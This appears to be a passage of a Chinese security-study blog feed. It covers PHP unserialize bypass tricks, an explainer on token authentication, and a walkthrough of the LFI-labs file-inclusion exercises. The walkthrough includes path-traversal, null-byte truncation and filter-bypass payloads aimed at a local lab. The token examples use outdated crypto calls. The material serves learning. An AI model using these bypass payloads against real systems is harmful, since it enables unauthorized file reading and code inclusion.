class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a=<span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果执行<code>unserialize(&#39;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#39;);</code>输出结果为<code>123</code></p><p>而把对象属性个数的值增大执行<code>unserialize(&#39;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#39;);</code>输出结果为<code>abc</code></p><h3 id="利用引用"><a href="#利用引用" class="headerlink" title="利用引用"></a>利用引用</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b= &amp;<span class="keyword">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;a===<span class="keyword">$this</span>-&gt;b)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="keyword">new</span> test());</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面这个例子将<code>$b</code>设置为<code>$a</code>的引用，可以使<code>$a</code>永远与<code>$b</code>相等</p><h3 id="16进制绕过字符的过滤"><a href="#16进制绕过字符的过滤" class="headerlink" title="16进制绕过字符的过滤"></a><a href="https://so.csdn.net/so/search?q=16%E8%BF%9B%E5%88%B6&spm=1001.2101.3001.7020">16进制</a>绕过字符的过滤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;%00*%00a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;abc&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;%00test%00b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;def&quot;</span>;&#125;</span><br><span class="line">可以写成</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;S:<span class="number">4</span>:<span class="string">&quot;\00*\00\61&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;abc&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;%00test%00b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;def&quot;</span>;&#125;</span><br><span class="line">表示字符类型的s大写时，会被当成<span class="number">16</span>进制解析。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;username = &#x27;admin&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function  __destruct()&#123;</span><br><span class="line">        echo 666;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function check($data)&#123;</span><br><span class="line">    if(stristr($data, &#x27;username&#x27;)!==False)&#123;</span><br><span class="line">        echo(&quot;你绕不过！！&quot;.PHP_EOL);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        return $data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// 未作处理前</span><br><span class="line">$a = &#x27;O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#x27;;</span><br><span class="line">$a = check($a);</span><br><span class="line">unserialize($a);</span><br><span class="line">// 做处理后 \75是u的16进制</span><br><span class="line">$a = &#x27;O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;&#125;&#x27;;</span><br><span class="line">$a = check($a);</span><br><span class="line">unserialize($a);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://blog.csdn.net/solitudi/article/details/113588692">https://blog.csdn.net/solitudi/article/details/113588692</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Token</title>
      <link href="/2022/05/05/Token/"/>
      <url>/2022/05/05/Token/</url>
      
        <content type="html"><![CDATA[<h1 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h1><h2 id="Token简介："><a href="#Token简介：" class="headerlink" title="Token简介："></a>Token简介：</h2><p>Token是计算机术语：令牌，令牌是一种能够控制站点占有媒体的特殊帧，以区别数据帧及其他控制帧。token其实说的更通俗点可以叫暗号，在一些数据传输之前，要先进行暗号的核对，不同的暗号被授权不同的数据操作。基于 Token 的身份验证方法</p><p>使用基于 Token 的身份验证方法，在服务端不需要存储用户的登录记录。大概的流程是这样的：</p><p>1.客户端使用用户名跟密码请求登录</p><p>2.服务端收到请求，去验证用户名与密码</p><p>3.验证成功后，服务端会签发一个 Token，再把这个 Token 发送给客户端</p><p>4.客户端收到 Token 以后可以把它存储起来，比如放在 Cookie 里或者 Local Storage 里</p><p>5.客户端每次向服务端请求资源的时候需要带着服务端签发的 Token</p><p>6.服务端收到请求，然后去验证客户端请求里面带着的 Token，如果验证成功，就向客户端返回请求的数据</p><h2 id="关于Token你需要知道的事："><a href="#关于Token你需要知道的事：" class="headerlink" title="关于Token你需要知道的事："></a>关于Token你需要知道的事：</h2><p>转自：<a href="https://link.jianshu.com/?t=http://alvinzhu.me/blog/2014/08/26/10-things-you-should-know-about-tokens/">https://link.jianshu.com/?t=http://alvinzhu.me/blog/2014/08/26/10-things-you-should-know-about-tokens/</a></p><ol><li>Token 应该被保存起来（放到 local / session stograge 或者 cookies）<br> 在单页应用程序中，有些用户刷新浏览器后会带来一些跟 token 相关的问题。而解决方法很简单：你应该把 token 保存到起来：<a href="https://link.jianshu.com/?t=https://github.com/auth0/angular-token-auth/blob/master/auth.client.js#L31">放到 session storage, local storage 或者是客户端的 cookie 里</a>。而浏览器不支持 session storage 时都应该转存到 cookies 里。<br> 如果你想“我把 token 保存到 cookie ，不就跟以前没有任何分别？”。可是在这种情况下你只是把 cookie 当作一个储存机制，而不是一种<a href="https://link.jianshu.com/?t=http://sitr.us/2011/08/26/cookies-are-bad-for-you.html">验证机制</a>。（比如说，这个 cookie 不会被 Web 框架用于用户验证，所以没有 XSRF 攻击的危险）。</li><li>Tokens 除了像 cookie 一样有有效期，而且你可以有更多的操作方法<br> Tokens 应该有一个有效期（在 <a href="https://link.jianshu.com/?t=http://tools.ietf.org/html/draft-ietf-oauth-json-web-token-15#section-4.1.4">JSON Web Tokens</a> 中是作为 exp<br> 属性），否则其他人只要登录过一次就可以永远地通过 API 的验证。Cookies 基于同样的理由也有一个有效期。<br> 在 Cookies 的使用中，有不同的选项可以控制 cookie 的生命周期：</li><li> cookies 可以在浏览器关闭后删除（session cookies）；2. 另外你可以实现服务器端的检查（通常由你使用的 Web 框架完成），还有也可以实现绝对有效期或弹性有效期（sliding window expiration）；3. Cookies 可以带有有效期地保存起来（浏览器关闭后也不删除）。</li></ol><p>而在 tokens 的使用中，一旦 token 过期，只需要重新获取一个。你可以使用一个接口去刷新 token：</p><ol><li> 让旧的 token 失效；2. 检查这个用户是不是还存在，权限是否被取消或者任何对你的程序来说是有必要的；3. 得到一个更新了有效期的 token。</li></ol><p>你甚至可以把 token 原来的发布时间也保存起来，并且强制在两星期后重新登录什么的。</p><p>12345678910111213141516</p><p>app.post(‘/refresh_token’, function (req, res) { // verify the existing token var profile = jwt.verify(req.body.token, secret); // if more than 14 days old, force login if (profile.original_iat - new Date() &gt; 14) { // iat == issued at return res.send(401); // re-logging } // check if the user still exists or if authorization hasn’t been revoked if (!valid) return res.send(401); // re-logging // issue a new token var refreshed_token = jwt.sign(profile, secret, { expiresInMinutes: 60*5 }); res.json({ token: refreshed_token });});</p><p>如果你需要撤回 tokens（当 token 的生存期比较长的时候这很有必要）那么你需要一个 token 的生成管理器去作检查。</p><ol start="3"><li>Local / session storage 不会跨域工作，请使用一个标记 cookie<br> 如果你设置一个 cookie 的域名为 .yourdomain.com<br> 它将可以被 youdomain.com<br> 和 app.yourdomain.com<br> 获取，这样用户登录并且转到app.yourdomain.com<br> 后也能很容易地从主域名找回这个 cookie（假如你的是电商网站）。<br> 而另一方面，保存在 local / session storage 的 tokens，就不能从不同的域名中读取（甚至是子域名也不行）。那你能怎么做？<br> 一个可能的选择是，当用户通过 app.yourdomain.com<br> 上面的验证时你生成一个 token 并且作为一个 cookie 保存到 .yourdomain.com</li></ol><p>1234567</p><p>$.post(‘/authenticate, function() { // store token on local/session storage or cookie …. // create a cookie signaling that user is logged in $.cookie(‘loggedin’, profile.name, ‘.yourdomain.com’);});</p><p>然后，在 youromdain.com<br>中你可以检查这个 cookie 是不是已经存在了，并且如果存在的话就转到 app.youromdain.com<br>去。从这以后，这个 token 将会对程序的子域名以及之后通常的流程都有效（直到这个 token 超过有效期）。<br>不过这将会导致 cookie 存在但 token 被删除了或其他意外情况的发生。在这种情况下，用户将不得不重新登录。但重要的是，像我们之前说的，我们不会这个用 cookie 作为验证方法，只是作为一个存储机制去支持存储信息在不同的域名中。</p><ol start="4"><li>每个 CORS（跨域资源共享）请求都会带上预请求（Preflight request）<br> 有些人指出 Authorization header 不是一个<a href="https://link.jianshu.com/?t=http://www.w3.org/TR/cors/">simple header</a>，因此对于一个特定的 URLs 的所有请求都会带上一个预请求。</li></ol><p>12345678910</p><p>OPTIONS <a href="https://link.jianshu.com/?t=https://api.foo.com/barGET">https://api.foo.com/barGET</a> <a href="https://link.jianshu.com/?t=https://api.foo.com/bar">https://api.foo.com/bar</a> Authorization: Bearer ….OPTIONS <a href="https://link.jianshu.com/?t=https://api.foo.com/bar2GET">https://api.foo.com/bar2GET</a> <a href="https://link.jianshu.com/?t=https://api.foo.com/bar2">https://api.foo.com/bar2</a> Authorization: Bearer ….GET <a href="https://link.jianshu.com/?t=https://api.foo.com/bar">https://api.foo.com/bar</a> Authorization: Bearer ….</p><p>但这只会发生在你发送 Content-Type: application/json<br>时。不过这说明已经出现在绝大多数的程序中了。<br>一个小小的警告，the OPTIONS<br>请求不会带有 Authorization header 自身，所以你的网络框架应该支持区别对待 OPTISON<br>和后来的请求。（微软的 IIS 因为某些原因好像会有问题）。</p><ol start="5"><li>当你需要流传送某些东西，请用 token 去获取一个已签名的请求。<br> 当使用 cookies 时，你可以很容易开始一个文件的下载或流传送内容。然而，在 tokens 的使用中，请求是通过 XHR 完成的，你不能依赖于它。而解决方法应该是像 AWS 那样通过生成一个签名了的请求，例如，Hawk Bewits 是一个很好的框架去启用它：<br> <strong>Request:</strong></li></ol><p>12</p><p>POST /download-file/123Authorization: Bearer…</p><p><strong>Response:</strong></p><p>1</p><p>ticket=lahdoiasdhoiwdowijaksjdoaisdjoasidja</p><p>这个 ticket 是无状态并且是基于 URL 的：host + path + query + headers + timestamp + HMAC，并且有一个有效期。所以它可以用于像只能在5分钟内去下载一个文件。<br>你然后可以转到 /download-file/123? ticket=lahdoiasdhoiwdowijaksjdoaisdjoasidja<br>中去。服务器就会检查这个 ticket 是不是有效然后像正常一样开始下一步的服务。</p><ol start="6"><li><a href="https://link.jianshu.com/?t=http://baike.baidu.com/view/50325.htm">XSS</a> 比 <a href="https://link.jianshu.com/?t=http://baike.baidu.com/view/1609487.htm">XSRF</a> 要更容易防范<br> XSS 攻击的原理是，攻击者插入一段可执行的 JavaScripts 脚本，该脚本会读出用户浏览器的 cookies 并将它传输给攻击者，攻击者得到用户的 Cookies 后，即可冒充用户。但是要防范 XSS 也很简单，在写入 cookies 时，将 HttpOnly<br> 设置为 true<br> ，客户端 JavaScripts 就无法读取该 cookies 的值，就可以有效防范 XSS 攻击。因为 Tokens 也是储存在本地的 session storage 或者是客户端的 cookies 中，也是会受到 XSS 攻击。所以在使用 tokens 的时候，必须要考虑过期机制，不然攻击者就可以永久持有受害用户帐号。<br> 相比 XSS，XSRF 的危害性更大，因为大多数 Web 框架都已经内置了 XSS 防范机制（例如在 Ruby on Rails 中，用户的输入在输出的时候都会做转义<br> 操作，攻击者插入的脚本就无法执行），对于大部分开发者而言，甚至连 XSRF 都不知道是什么玩意，更别提防范了。XSRF 目前并不是每个 Web 框架都有防范机制，因此开发者更应该留意 XSRF 。</li><li>注意 token 的大小<br> Token 机制在每次请求 API 的时候，都需要带上一个 Authorization<br> 的 Http Header 。</li></ol><p>123</p><h1 id="TokenGET-fooAuthorization-Bearer-…2kb-token…"><a href="#TokenGET-fooAuthorization-Bearer-…2kb-token…" class="headerlink" title="TokenGET /fooAuthorization: Bearer …2kb token…"></a>TokenGET /fooAuthorization: Bearer …2kb token…</h1><p>123</p><h1 id="CookieGET-fooconnect-sid-…20-bytes-cookie…"><a href="#CookieGET-fooconnect-sid-…20-bytes-cookie…" class="headerlink" title="CookieGET /fooconnect.sid: …20 bytes cookie…"></a>CookieGET /fooconnect.sid: …20 bytes cookie…</h1><p>Token 的大小其实由你储存在 token 中的信息量所决定，例如可能有 nickname<br>，openid<br>等开发者另外加上的信息。<br>但是 session cookies 机制只需要一个字串作为用户标识即可（例如 PHP 的 PHPSESSIONID），其中关于用户的信息都会直接储存到服务端的数据库中，当用户请求时才从数据库中捞出来用。<br>当然 Token 机制也可以仿照 session cookies 机制这么做了，也是个有效控制 token 大小的方法。<br>Token 中只保留关键的几条身份标识信息，其余都放到数据库里面了，权限控制的时候再捞出。这样做的好处是，开发者可以完全掌控 token，因为关键信息都已经是你代码和数据库中的一部分了，想怎么弄都可以了。<br>举个例子：</p><p>123</p><p>GET /fooAuthorization: Bearer ……500 bytes token….Then on the server:</p><p>12345678910</p><p>app.use(‘/api’, // 首先检查 token； expressJwt({secret: secret}), // 然后再从数据库中捞出用户信息。 function(req, res, next) { req.user.extra_data = get_from_db(); next(); });</p><p>另外值得一提的是，你也可以把东西都丢 Cookies 里面（而不是只丢个身份标识字串）。只要确保资料经过了严格的加密，攻击者无法利用，现在有些 Web 框架已经有类似机制，例如 Nodejs 的这个插件 <a href="https://link.jianshu.com/?t=https://github.com/mozilla/node-client-sessions">mozilla/node-client-sessions</a>。</p><ol start="8"><li>有需要的话，要加密并且签名 token<br> 虽然 TLS/SSL 机制可以隔绝大多数中间人攻击，但是如果 token 中带有了用户的敏感信息，开发者也应该要加密这些信息。<br> 使用 JWT（文中第 9 点） 可以加密 token，但是由于目前大多数 Web 框架还未支持 JWT，所以可以使用 AES-CBC 算法加密 token。</li></ol><p>1234567891011121314151617181920</p><p>app.post(‘/authenticate’, function (req, res) { // 校验用户； // 加密 token； var encrypted = { token: encryptAesSha256(‘shhhh’, JSON.stringify(profile)) }; // 给加密后的 token 签名； var token = jwt.sign(encrypted, secret, { expiresInMinutes: 60*5 }); res.json({ token: token });}function encryptAesSha256 (password, textToEncrypt) { var cipher = crypto.createCipher(‘aes-256-cbc’, password); var crypted = cipher.update(textToEncrypt, ‘utf8’, ‘hex’); crypted += cipher.final(‘hex’); return crypted;}// 上面就是 encrypt-then-MAC （加密后签名）做法。</p><p>当然你也可以用文中的第 7 点，直接将敏感信息丢数据库中。</p><ol start="9"><li>将 JSON Web Tokens 应用到 OAuth 2<br> OAuth 2 是一个解决身份验证的授权协议，并且广泛地使用了 token 。<br> 用户通过 OAuth 2 协议授权第三方应用权限，然后服务器返回一个 access_token<br> 给第三方应用，通常也带有 scope<br> 参数，第三方应用通过带上access_token<br> 请求服务器，可以在授权范围（scope）内调用 API。<br> 一般来说，类似这种 token 是不透明的，就是核心数据都储存以 hash-table 结果储存在服务器中，客户端只持有一个令牌<br> （access_token），任何人都可以用这个令牌在授权范围（scope）内调用服务器端的 API。<br> Signed tokens（例如 <a href="https://link.jianshu.com/?t=http://jwt.io/">JWT</a>)）和这种形式的 token 最主要的区别是，JWT 是无状态的，它不储存在服务端 hash-table 中，服务端中不保留 JWT 请求的相关信息，JWT 会把授权信息和 API 调用返回都丢一起返回给客户端。<br> JWT 通常以 Base64 + AES 方式编码传输。OAuth 2 协议也支持 JWT，因为 OAuth 2 并未限制 access_token 数据格式，你可以将 JWT 应用在 OAuth 2 上。</li><li>Tokens 不是万能的解决方法，得根据你的需求自行采用<br>这些年来，我们帮助过不少大公司实现了他们的以 Token 为基础的验证授权架构。曾经有一家 10k + 员工，有着大量数据的公司，他们想实现一个中央权限管理系统，其中有一个需要是某个员工只能读取某个国家某个医院某个床位的id<br>和name<br>字段数据，想想这样的细粒度的权限管理是多么难实现，无论是技术上还是行政上。<br>当然采用 tokens 与否，得看大家的具体需求，但是，要忠告大家的是，不要什么内容都写到 tokens 了，加之前想想有没有这个必要。</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>文件下载常用路径</title>
      <link href="/2022/05/03/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%B8%B8%E7%94%A8%E8%B7%AF%E5%BE%84/"/>
      <url>/2022/05/03/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%B8%B8%E7%94%A8%E8%B7%AF%E5%BE%84/</url>
      
        <content type="html"><![CDATA[<h1 id="文件下载漏洞："><a href="#文件下载漏洞：" class="headerlink" title="文件下载漏洞："></a>文件下载漏洞：</h1><img src="/2022/05/03/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%B8%B8%E7%94%A8%E8%B7%AF%E5%BE%84/1.png" class="">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞</title>
      <link href="/2022/04/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/04/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>[[文件下载常用路径]]</p><h1 id="文件包含漏洞-LFI-labs"><a href="#文件包含漏洞-LFI-labs" class="headerlink" title="文件包含漏洞 LFI labs"></a>文件包含漏洞 LFI labs</h1><h2 id="LFI-1"><a href="#LFI-1" class="headerlink" title="LFI-1"></a>LFI-1</h2><p>根据提示我们直接访问之前在文件夹里写的shell脚本。</p><p><code>http://127.0.0.1/lfi-labs-master/LFI-1/?page=../info.php#</code></p><p>../指的是上级文件夹。</p><h2 id="LFI-2"><a href="#LFI-2" class="headerlink" title="LFI-2"></a>LFI-2</h2><p>根据提示我们采用%00进行截断。</p><p><code> http://127.0.0.1/lfi-labs-master/LFI-2/?library=../../info.php%00</code></p><p>使用%00截断注意的问题：</p><p>（1）php版本小于5.3.4。<br>（2）php的magic_quotes_gpc为OFF状态。</p><h2 id="LFI-3"><a href="#LFI-3" class="headerlink" title="LFI-3"></a>LFI-3</h2><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span>     <span class="keyword">include</span>(<span class="string">&quot;../common/header.php&quot;</span>);   <span class="meta">?&gt;</span></span><br><span class="line">​</span><br><span class="line">&lt;!-- <span class="keyword">from</span> http:<span class="comment">//www.ush.it/2009/02/08/php-filesystem-attack-vectors/ --&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> hint(<span class="string">&quot;will include the arg specified in the GET parameter \&quot;file\&quot;, looks for .php at end - bypass by apending /. (slash plus dot)&quot;</span>); <span class="meta">?&gt;</span></span><br><span class="line">​</span><br><span class="line">​</span><br><span class="line">&lt;form action=<span class="string">&quot;/LFI-3/index.php&quot;</span> method=<span class="string">&quot;GET&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">​</span><br><span class="line">​</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (substr(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>], -<span class="number">4</span>, <span class="number">4</span>) != <span class="string">&#x27;.php&#x27;</span>)</span><br><span class="line"> <span class="keyword">echo</span> file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;You are not allowed to see source files!&#x27;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p> 两个函数</p><ul><li><p>substr()：字符串裁剪，返回字符串的一部分，其用法substr(string,start,length)，如果start为负数就是从末尾开始返回长度为length的字符串。</p></li><li><p>file_get_contents()：把整个文件读入一个字符串中。</p><p>所以这段源代码是对get请求到的file查看其文件后缀，如果文件后缀与php相同就会禁止查看源码，如果后缀不是php才能查看其源码，也就是文件上传漏洞里的黑名单嘛。</p><p>解决方法：</p><p>黑名单绕过，包括但不局限于</p><ul><li><p>大小写绕过：php-&gt;PHp</p></li><li><p>空格绕过：php-&gt;php&lt;空格&gt;，这个得抓包后在hex中修改</p></li><li><p>加点饶工：php-&gt;php.</p></li><li><p>特殊字符绕过：php-&gt;php::$DATA</p></li><li><p>使用’.ph&lt;’进使用’.ph&lt;’进行<code>.php</code>拓展过滤渗出行<code>.php</code>拓展过滤渗出</p></li></ul></li></ul><h1 id="LFI-4"><a href="#LFI-4" class="headerlink" title="LFI-4"></a>LFI-4</h1><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>     <span class="keyword">include</span>(<span class="string">&quot;../common/header.php&quot;</span>);   <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!-- <span class="keyword">from</span> http:<span class="comment">//www.ush.it/2009/02/08/php-filesystem-attack-vectors/ --&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> hint(<span class="string">&quot;will include the arg specified in the GET parameter \&quot;class\&quot;, appends .php to end, defeat with NULL byte %00&quot;</span>); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;/LFI-4/index.php&quot;</span> method=<span class="string">&quot;GET&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;class&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;includes/class_&#x27;</span>.addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;class&#x27;</span>]).<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其中的<code>includes/class_</code>相当于一个文件路径，没啥限制直接使用%00进行截断就行</p><h1 id="LFI-5"><a href="#LFI-5" class="headerlink" title="LFI-5"></a>LFI-5</h1><p>查看源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- <span class="keyword">from</span> http:<span class="comment">//hakipedia.com/index.php/Local_File_Inclusion --&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span>     <span class="keyword">include</span>(<span class="string">&quot;../common/header.php&quot;</span>);   <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> hint(<span class="string">&quot;will include the arg specified in the GET parameter \&quot;file\&quot;, strips prepended \&quot;../\&quot; strings, must encode / with %2f&quot;</span>); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;/LFI-5/index.php&quot;</span> method=<span class="string">&quot;GET&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="variable">$file</span> = str_replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">include</span>(<span class="string">&quot;pages/<span class="subst">$file</span>&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">include</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>两个函数：</p><ul><li>str_replace():将接收到的字符串中的../替换为NULL</li><li>isset():函数用于检测变量是否已设置并且非 NULL。如果指定变量存在且不为 NULL，则返回 TRUE，否则返回 FALSE。</li></ul><p>绕过方法：</p><p>直接进行双写绕过<code> http://127.0.0.1/lfi-labs-master/LFI-5/?file=....//....//info.php</code></p><h1 id="LFI-6"><a href="#LFI-6" class="headerlink" title="LFI-6"></a>LFI-6</h1><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>     <span class="keyword">include</span>(<span class="string">&quot;../common/header.php&quot;</span>);   <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!-- <span class="keyword">from</span> https:<span class="comment">//pentesterlab.com/exercises/php_include_and_post_exploitation/course --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> hint(<span class="string">&quot;will include the arg specified in the POST parameter \&quot;page\&quot;&quot;</span>);  <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;/LFI-6/index.php&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> 